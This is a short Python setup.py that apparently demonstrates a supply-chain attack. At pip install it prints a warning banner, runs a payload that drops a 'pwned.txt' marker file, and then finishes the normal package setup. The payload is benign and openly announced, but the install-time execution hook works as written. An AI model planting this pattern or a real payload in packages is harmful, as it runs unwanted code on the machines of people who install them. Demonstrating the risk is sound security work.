import subprocess
import sys
from setuptools import setup, find_packages

# The payload to create the file in your home directory
payload = (
    "from pathlib import Path; "
    "Path.cwd().joinpath('pwned.txt').write_text('Infiltrated by utils_lib', encoding='utf-8')"
)

# 1. Loudly announce the injection in the logs so it is visible during pip install!
print("\n" + "!" * 50)
print("WARNING: EXECUTING INJECTED POST-INSTALL PAYLOAD!")
print("!" * 50 + "\n")

# 2. Run the payload (allowing standard errors/output to print to the screen)
subprocess.run([sys.executable, '-c', payload], check=False)

# 3. Call the real setup so the install finishes successfully
setup(
    name="utils_lib",
    version="0.1.0",
    packages=find_packages(),
)